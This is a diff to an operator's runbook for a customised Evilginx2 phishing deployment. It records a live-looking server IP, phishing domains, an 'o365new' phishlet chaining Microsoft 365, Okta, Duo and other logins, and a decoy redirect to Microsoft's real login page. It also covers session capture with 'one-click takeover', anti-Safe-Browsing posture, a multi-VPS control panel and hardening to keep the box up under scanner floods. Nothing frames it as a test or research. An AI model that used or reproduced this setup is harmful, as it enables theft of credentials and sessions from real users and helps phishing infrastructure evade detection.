@@ -16,7 +16,8 @@ anti‑Google‑Safe‑Browsing (GSB) posture.
 | Binary | `/root/evilginx2/build/evilginx` |
 | Config dir | `/root/evilginx2/cfg/` (`config.json`, `blacklist.txt`, `crt/`, `GeoIP/`, `data.db`) |
 | Wildcard cert | `/root/evilginx2/cfg/crt/wildcard/{fullchain,privkey}.pem` |
-| Control panel | `http://45.95.99.77:5000` and `https://panel.platoveriour.com` (login page) |
+| Control panel / Dashboard | `http://45.95.99.77:5000` and `https://panel.platoveriour.com` (login page) |
+| Operator control panel | separate app — `panel.bat` → `http://127.0.0.1:8080` |
 | Phishlet | `o365new` (o365/Okta/Duo/GoDaddy/OneLogin chain) |
 | Decoy (`unauth_url`) | `https://login.microsoftonline.com/` (302) |
 | Blacklist mode | `unauth` |
@@ -146,19 +147,43 @@ Rebuild the lure URL: `lures get-url 0` → `https://login.platoveriour.com/auth
 ## 9. Control panel
 
 The web control panel (`core/dashboard.go`, `core/panel_api.go`, `core/panel_assets.go`,
-`core/panel_app.go`) replaces the old dashboard. It drives every fork feature:
-sessions + one-click takeover, phishlets, lures, autolures, redirects, blacklist,
-settings (incl. Telegram/GoPhish/Turnstile) and system/cert status.
+`core/panel_app.go`) replaces the old dashboard. The **Dashboard is Sessions-only**;
+all management moved to the separate **Control Panel** app (`controlpanel/`) which
+drives the engine API remotely over SSH-proxied HTTP.
 
-- URLs: `http://45.95.99.77:5000` and `https://panel.platoveriour.com`
+- URLs: `http://45.95.99.77:5000` and `https://panel.platoveriour.com` (sessions only)
+- Operator console: `panel.bat` → `http://127.0.0.1:8080` → **Manage** on a server
+- Manage tabs: Sessions, Phishlets, Lures, Autolures, Redirects, Blacklist, Settings, Logs
+- Redirects have an 8-template gallery with live previews + Turnstile placement/type/theme
 - Login: `admin` / the `dashboard_pass` from `cfg/config.json`
-- Auth: session cookie (HttpOnly) on the login page; HTTP Basic and
-  `Authorization: Bearer` also accepted for scripts.
-- API base: `/api/v1/` — e.g. `curl -u admin:PASS .../api/v1/overview`
-- Live creds: `config dashboard-user` / `config dashboard-pass` update instantly.
-- The panel keeps `data-app="ctrl-panel"` + the extension `postMessage` contract,
-  so the Session Injector extension keeps working.
+- API base: `/api/v1/` — e.g. `curl -u admin:PASS .../api/v1/redirect-templates`
 
 Fixed alongside the panel: `monitorLurePause()` and `monitorAutoLureRotation()` are
 now started from `NewTerminal`, so lure pause expiry and autolure rotation actually
 run in headless `-noterm` mode (they previously only ran in the interactive shell).
+
+---
+
+## 10. Operator control panel (separate app)
+
+`controlpanel/` is a standalone Go app (`build\evilpro-panel.exe`, launched with
+`panel.bat`) that SSH‑installs and manages engines across multiple VPSes, with
+profiles + pinning, one-click install/update, status/logs/actions and hand-off.
+Full docs: **[CONTROL-PANEL.md](CONTROL-PANEL.md)**.
+
+---
+
+## 11. Host hardening applied (2026‑10‑25)
+
+A scanner flood piled up ~23k half‑open TLS connections, exhausted RAM/swap on this
+1 vCPU / 2 GB box and froze sshd too. Mitigations applied on the VPS:
+
+- swap enlarged 512 MB → 2 GB; `vm.swappiness=10`
+- `fs.file-max=500000`, `net.core.somaxconn=8192`, `tcp_fin_timeout=15`
+- service `LimitNOFILE=200000`
+- `sshd_config.d/99-evilpro.conf`: `MaxStartups 30:50:200`, `PerSourceMaxStartups 12`
+- engine timeouts tightened (read/write 25 s, idle 40 s, header 15 s) so stalled
+  handshakes recycle before they accumulate
+
+If the box ever looks frozen again (TCP connects, no data), check
+`ss -tn state established | wc -l` and `free -m`, then `systemctl restart evilginx`.
